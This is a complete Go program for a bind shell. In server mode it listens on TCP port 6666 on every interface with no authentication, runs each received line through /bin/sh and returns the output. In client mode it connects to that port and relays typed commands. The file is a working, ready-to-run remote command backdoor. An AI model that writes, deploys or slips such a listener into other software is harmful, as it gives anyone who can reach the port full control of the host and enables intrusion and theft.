package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
    "os/exec"
)

const defaultPort = "6666"

func main() {
    if len(os.Args) > 1 && os.Args[1] == "client" {
        startClient(os.Args[2])
    } else {
        startServer()
    }
}

func startClient(host string) {
    conn, err := net.Dial("tcp", net.JoinHostPort(host, defaultPort))
    if err != nil {
        fmt.Println("Connection error:", err)
        return
    }
    defer conn.Close()

    fmt.Println("Connected. Type commands:")
    scanner, reader := bufio.NewScanner(os.Stdin), bufio.NewReader(conn)

    for fmt.Print("> "); scanner.Scan(); fmt.Print("> ") {
        conn.Write([]byte(scanner.Text() + "\n"))
        if output, err := reader.ReadString('\n'); err == nil {
            fmt.Print(output)
        } else {
            fmt.Println("Read error:", err)
            break
        }
    }
}

func startServer() {
    ln, err := net.Listen("tcp", ":"+defaultPort)
    if err != nil {
        fmt.Println("Listen error:", err)
        return
    }
    defer ln.Close()
    fmt.Println("Server listening on port", defaultPort)

    for {
        if conn, err := ln.Accept(); err == nil {
            go handleConn(conn)
        } else {
            fmt.Println("Accept error:", err)
        }
    }
}

func handleConn(conn net.Conn) {
    defer conn.Close()
    scanner := bufio.NewScanner(conn)

    for scanner.Scan() {
        if output, err := exec.Command("/bin/sh", "-c", scanner.Text()).CombinedOutput(); err == nil {
            conn.Write(output)
        } else {
            conn.Write([]byte(fmt.Sprintf("Execution error: %v\n", err)))
        }
    }
}